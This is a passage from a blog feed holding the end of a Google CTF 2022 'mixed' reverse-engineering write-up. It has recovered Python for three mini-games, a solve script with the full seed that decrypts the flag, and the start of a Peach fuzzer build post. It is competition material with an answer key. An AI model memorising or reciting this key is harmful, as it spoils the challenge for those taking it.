    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1267034045110727999721745963007&lt;/span&gt;
    fuel &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
    x, y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    stops &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; set([(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)])
    log &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Fuels:&amp;#34;&lt;/span&gt;, fuel)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;):
        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; w(m, i, j):
                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;🧱&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; (j, i) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (x, y):
                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;🚓&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; (j, i) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;🏁&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; (j, i) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; stops:
                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;⛽️&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  &amp;#39;&lt;/span&gt;
        print (s)
    inp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; inp:
        log &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; c
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wasd&amp;#39;&lt;/span&gt;:
            fail(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Nope!&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; fuel &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            fail(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Empty...&amp;#39;&lt;/span&gt;)
        dx, dy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;:(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;:(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;:(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt;:(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)}[c]
        x &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; dx
        y &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; dy
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; w(m, y, x):
            fail(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Crash!&amp;#39;&lt;/span&gt;)
        fuel &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (x, y) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; stops:
            stops&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;remove((x, y))
            fuel &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; (x, y) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Nice!&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; log

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;game2&lt;/span&gt;():
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Math quiz time!&amp;#39;&lt;/span&gt;)
    qs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sum&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;), (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;difference&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;), (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;product&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;), (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ratio&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;), (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;remainder from division&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;))
    log &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; q &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; qs: 
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;What is the &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; of &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; and &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; q)
        x, a, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; q
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sum&amp;#39;&lt;/span&gt;:
            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;difference&amp;#39;&lt;/span&gt;:
            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; b
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;product&amp;#39;&lt;/span&gt;:
            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; b
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ratio&amp;#39;&lt;/span&gt;:
            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; b
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;remainder from division&amp;#39;&lt;/span&gt;:
            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; b
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;What?&amp;#39;&lt;/span&gt;)
        inp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(input())
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; inp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; r:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Correct!&amp;#39;&lt;/span&gt;)
            log &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; str(inp) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Wrong!&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; log
    &lt;span style=&#34;color:#75715e&#34;&gt;#_17_31_72_3_2_&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;game3&lt;/span&gt;():
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Speed typing game.&amp;#39;&lt;/span&gt;)
    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time()
    text &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Text: Because of its performance advantage, today many language implementations
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  execute a program in two phases, first compiling the source code into bytecode,
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  and then passing the bytecode to the virtual machine.
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    words &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; text&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()
    it &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    log &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; it &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; len(words):
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%0.2f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; seconds left.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; t)))
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[32m&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(words[:it]), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[39m &amp;#39;&lt;/span&gt;, words[it])
        inp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;:
            fail(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Too slow!&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; inp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; words[it]:
            log &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; words[it]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;upper() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;
            it &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            fail(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;You made a mistake!&amp;#39;&lt;/span&gt;)
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Nice!&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; log
&lt;span style=&#34;color:#75715e&#34;&gt;#_BECAUSE_OF_ITS_PERFORMANCE_ADVANTAGE,_TODAY_MANY_LANGUAGE_IMPLEMENTATIONS_EXECUTE_A_PROGRAM_IN_TWO_PHASES,_FIRST_COMPILING_THE_SOURCE_CODE_INTO_BYTECODE,_AND_THEN_PASSING_THE_BYTECODE_TO_THE_VIRTUAL_MACHINE._&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Pass 3 tests to prove your worth!&amp;#39;&lt;/span&gt;)
    seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;seed:&amp;#39;&lt;/span&gt;
    seed &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; game1() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;
    print (seed)
    seed &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; game2() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;
    print (seed)
    seed &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; game3()
    print (seed)
    print ()
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You can drive to work, know some maths and can type fast. You&amp;#39;re hired!&amp;#34;&lt;/span&gt;)
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your sign-on bonus:&amp;#39;&lt;/span&gt;, cry(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?n&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa5\x7f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6Jvh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x95\xcc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1e\x95\x99&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6a&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x11\xf6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;OV&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x88\xc1\x9f\xde\xb5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9d\xae\x14\xde\x18&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;YHI&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\xd5\x90\x8a\x18&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1l&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0\x16&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^O;]&amp;#39;&lt;/span&gt;, seed)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;solve&#34;&gt;SOLVE!&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ks&lt;/span&gt;(seed):
    random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seed(seed)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; (random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cry&lt;/span&gt;(s, seed):
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x, y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(ks(seed), s):
        r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(x &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; y)
        bytes(r)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r

seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;seed:sssddwwddwddsssdssaaawwssaaaassddddddd:_17_31_72_3_2_:_BECAUSE_OF_ITS_PERFORMANCE_ADVANTAGE,_TODAY_MANY_LANGUAGE_IMPLEMENTATIONS_EXECUTE_A_PROGRAM_IN_TWO_PHASES,_FIRST_COMPILING_THE_SOURCE_CODE_INTO_BYTECODE,_AND_THEN_PASSING_THE_BYTECODE_TO_THE_VIRTUAL_MACHINE._&amp;#39;&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your sign-on bonus:&amp;#39;&lt;/span&gt;, cry(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?n&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa5\x7f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6Jvh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x95\xcc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1e\x95\x99&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6a&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x11\xf6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;OV&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x88\xc1\x9f\xde\xb5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9d\xae\x14\xde\x18&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;YHI&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd8\xd5\x90\x8a\x18&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1l&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0\x16&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^O;]&amp;#39;&lt;/span&gt;, seed))

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;afterword&#34;&gt;Afterword&lt;/h2&gt;
&lt;p&gt;After failed to solve adamd in DEFCON 30 QUALS, I finally solved a Python 3.11 challenge :D&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 614; 
			flex-basis: 1474px&#34;
	&gt;
	&lt;a href=&#34;/post/google-ctf-2022-mixed-writeup/lol.png&#34; data-size=&#34;430x70&#34;&gt;
		&lt;img src=&#34;/post/google-ctf-2022-mixed-writeup/lol.png&#34;
			width=&#34;430&#34;
			height=&#34;70&#34;
			srcset=&#34;/post/google-ctf-2022-mixed-writeup/lol_hubf7043f79e505ba19f42c321a52a8ee8_12045_480x0_resize_box_3.png 480w, /post/google-ctf-2022-mixed-writeup/lol_hubf7043f79e505ba19f42c321a52a8ee8_12045_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>How to build peach fuzzer on Ubuntu18.04</title>
        <link>/post/how-to-build-peach-fuzzer-on-ubuntu1804/</link>
        <pubDate>Fri, 03 Jun 2022 00:38:33 +0800</pubDate>
        
        <guid>/post/how-to-build-peach-fuzzer-on-ubuntu1804/</guid>
        <description>&lt;img src="/post/how-to-build-peach-fuzzer-on-ubuntu1804/cover.jpg" alt="Featured image of post How to build peach fuzzer on Ubuntu18.04" /&gt;&lt;p&gt;Repository:&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Modify from a dockerfile based on DEBIAN: &lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/vanhauser-thc/peachpro/main/Dockerfile&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://raw.githubusercontent.com/vanhauser-thc/peachpro/main/Dockerfile&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell&#34;&gt;shell&lt;/h2&gt;
